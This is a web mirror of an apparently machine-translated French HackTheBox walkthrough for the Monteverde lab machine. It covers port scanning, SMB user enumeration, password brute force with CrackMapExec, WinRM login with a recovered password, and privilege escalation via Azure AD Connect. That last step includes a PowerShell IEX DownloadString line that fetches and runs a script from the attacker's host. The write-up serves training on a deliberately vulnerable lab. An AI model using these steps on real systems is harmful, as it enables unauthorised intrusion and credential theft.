<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤰 👨🏾‍🌾 👩🏿‍💻 HackTheBox. Procédure pas à pas Monteverde. Brute SMB et LPE via Azure Admins 🙇 🙃 👨🏻‍🔬</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Je continue de publier des solutions envoyées pour un traitement ultérieur à partir du site HackTheBox . 
 
 Dans cet article, nous forçons le mot de ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox. Procédure pas à pas Monteverde. Brute SMB et LPE via Azure Admins</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/506524/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/2m/jp/6q/2mjp6qqz5acr6edjuiddifkccba.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je continue de publier des solutions envoyées pour </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">un traitement ultérieur à</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> partir du site </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous forçons le mot de passe SMB par force brute et augmentons les privilèges d'un administrateur au nom d'un membre du groupe Azure Admins. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La connexion au laboratoire se fait via VPN. </font><font style="vertical-align: inherit;">Il est recommandé de ne pas se connecter à partir d'un ordinateur professionnel ou d'un hôte où les données importantes pour vous sont disponibles, car vous entrez dans un réseau privé avec des personnes qui connaissent quelque chose dans le domaine de la sécurité de l'information :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information organisationnelle</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette machine a une adresse IP 10.10.10.172, que j'ajoute à / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.172    monteverde.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, nous analysons les ports ouverts. </font><font style="vertical-align: inherit;">Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. </font><font style="vertical-align: inherit;">Nous analysons tous les ports TCP et UDP à partir de l'interface tun0 à une vitesse de 500 paquets par seconde.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.172   --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/yp/hs/eu/yphseupjfeatcziqzpsdtm6ibdk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'hôte a de nombreux ports ouverts. </font><font style="vertical-align: inherit;">Maintenant, scannez-les avec nmap pour filtrer et sélectionnez ceux dont vous avez besoin.</font></font><br>
<br>
<pre><code class="bash hljs">nmap monteverde.htb -p49778,88,593,49667,53,445,5985,49675,9389,3268,49706,389,464,49674,139,636,135,3269,49673</code></pre><br>
<img src="https://habrastorage.org/webt/9s/nm/af/9snmafnjta1vi4pimoszjcrkuna.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, pour des informations plus détaillées sur les services qui fonctionnent sur les ports, nous allons exécuter une analyse avec l'option -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A monteverde.htb -p88,593,53,445,5985,9389,3268,389,464,139,636,135,3269</code></pre><br>
<img src="https://habrastorage.org/webt/rt/sl/ls/rtsllshrzwl12ltl_fvtthege_o.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, vérifiez SMB. </font><font style="vertical-align: inherit;">Nous le faisons avec enum4linux. </font><font style="vertical-align: inherit;">Nous obtenons donc des utilisateurs, ainsi que leur appartenance au groupe.</font></font><br>
<br>
<pre><code class="bash hljs">enum4linux -a monteverde.htb</code></pre><br>
<img src="https://habrastorage.org/webt/i1/fs/_e/i1fs_egwv74fjcmdeyl289hvxzu.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/wk/p-/vt/wkp-vtupeimqujldarc0-asqtje.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UTILISATEUR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme d'habitude, alors que nous recherchons un point d'entrée, en même temps des mots de passe de force brute. </font><font style="vertical-align: inherit;">Étant donné que la politique de mot de passe définit le nombre minimum de caractères dans le mot de passe - 7, nous établirons les listes suivantes. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/fy/cs/ejfycsenpvvgxdrzyld_uglz3iw.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/as/uq/ha/asuqhaidrv20psgmiznpzi9n_bq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Exécutez maintenant la brute à l'aide de CrackMapExec.</font></font><br>
<br>
<pre><code class="bash hljs">cme smb monteverde.htb -u ./users.txt -p ./passwords.txt</code></pre><br>
<img src="https://habrastorage.org/webt/sz/9u/ds/sz9udsiuuzkyp-hqwq-ybfnaw1q.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et étonnamment, ce fut un succès - nous avons trouvé les informations d'identification de l'utilisateur. </font><font style="vertical-align: inherit;">Voyons les ressources disponibles pour l'utilisateur.</font></font><br>
<br>
<pre><code class="bash hljs">cme smb monteverde.htb -u SABatchJobs -p SABatchJobs --shares</code></pre><br>
<img src="https://habrastorage.org/webt/j7/vb/gt/j7vbgtgwfxct1jtd3futqhj1uqq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et tournez-vous vers la ressource $ utilisateurs.</font></font><br>
<br>
<pre><code class="bash hljs">smbclient -U SABatchJobs%SABatchJobs //10.10.10.172/users$</code></pre><br>
<img src="https://habrastorage.org/webt/hk/ya/fy/hkyafylcwfw3myg_dygntrjkfse.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Examinons récursivement tous les fichiers sur le serveur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2h/yz/5o/2hyz5omvy1cgspc_npsoelyavui.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et voyons ce qu'il y a dans le fichier. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/uh/-w/qi/uh-wqiidqdkvoxrlfxfpoivwtre.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Connectez-vous maintenant à WinRM et récupérez le drapeau utilisateur.</font></font><br>
<br>
<pre><code class="bash hljs">evil-winrm -i 10.10.10.172 -u mhope -p <span class="hljs-string">'4n0therD4y@n0th3r$'</span></code></pre><br>
<img src="https://habrastorage.org/webt/r5/tq/bn/r5tqbnh4qqmfz_lgu8ydkjsyty8.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RACINE</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons les informations utilisateur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ek/6g/qb/ek6gqb9-9_eba2lx6cbovpucwoe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il est membre du groupe Azure Admins - il s'agit d'un vecteur LPE. </font><font style="vertical-align: inherit;">Nous utilisons </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Azure-ADConnect</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour nous connecter à la base de données Azure. </font><font style="vertical-align: inherit;">Nous chargeons le script du serveur local en mémoire sur la machine distante et l'exécutons.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://10.10.15.60/Azure-ADConnect.ps1'</span>)<font></font>
Azure<span class="hljs-literal">-ADConnect</span> <span class="hljs-literal">-server</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-db</span> ADSync</code></pre><br>
<img src="https://habrastorage.org/webt/6h/gx/jy/6hgxjyx9ldw_agzi7alx5wqedc0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous obtenons les informations d'identification de l'administrateur. </font><font style="vertical-align: inherit;">Nous nous connectons et ramassons le drapeau. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/mq/yp/z6mqypiofscgatdbad9rogrjero.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons un contrôle total sur la machine. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez nous rejoindre sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Vous y trouverez du matériel intéressant, des cours fusionnés ainsi que des logiciels. </font><font style="vertical-align: inherit;">Créons une communauté dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pourrons toujours nous entraider pour tout problème informatique et de sécurité de l'information.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr506506/index.html">Mappage de données json sur une structure C ++</a></li>
<li><a href="../fr506508/index.html">Développement axé sur les hamacs: «Le sommeil est une partie importante du travail d'un programmeur»</a></li>
<li><a href="../fr506510/index.html">Burnout [% state employee%] = facteur (Peut-être <market_economy>)</a></li>
<li><a href="../fr506516/index.html">Enregistrez le mot de passe: une fabuleuse implémentation du schéma de partage secret de Shamir en Python</a></li>
<li><a href="../fr506520/index.html">Conférence DEVOXX UK. Choisissez un framework: Docker Swarm, Kubernetes ou Mesos. Partie 1</a></li>
<li><a href="../fr506530/index.html">Comment choisir un UPS</a></li>
<li><a href="../fr506532/index.html">À travers les épines jusqu'aux étoiles: fabriquez un appareil pour pointer un pointeur laser sur n'importe quel objet céleste</a></li>
<li><a href="../fr506538/index.html">Comment Wikipédia peut révéler vos données personnelles et comment il les utilise réellement</a></li>
<li><a href="../fr506542/index.html">Enregistrement vidéo bricolage dans le cloud</a></li>
<li><a href="../fr506548/index.html">Utilisation pratique de Kotlin dans les startups et les entreprises</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>